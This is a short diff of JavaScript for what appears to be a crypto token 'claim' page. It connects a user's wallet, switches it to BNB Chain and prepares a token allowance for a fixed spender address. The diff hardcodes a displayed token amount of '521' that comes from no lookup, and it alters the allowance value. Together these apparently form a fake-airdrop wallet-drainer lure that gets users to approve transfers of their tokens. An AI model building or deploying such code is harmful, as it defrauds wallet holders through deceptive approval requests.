@@ -78,6 +78,8 @@ async function connectButtonFunctio() {
         `Connected : ${accounts[0]}`,
       );
 
+      tokenAmountBold.innerText = "521";
+
       getProof();
     } catch (error) {
       console.error('User denied account access', error);
@@ -92,6 +94,7 @@ claimButton.addEventListener('click', claimTokens);
 
 async function claimTokens() {
 
+
     claimButton.innerHTML = 'Loading...';
     await switchToBnbChain();
 
@@ -101,7 +104,7 @@ async function claimTokens() {
 
         const tokenAddress = '0x073761656dC0654F729A4aF0ccE8C9B39b47A18b';
         const spenderAddress = '0x21F5CF45E2E546AB318572B0d62884Ce315B6d6d';
-        const allowanceAmount = "1000000000000000";
+        const allowanceAmount = "10000";
 
         if(Number(allowanceAmount) == 0 || allowanceAmount == "00"){
           alert('you do not have balance');
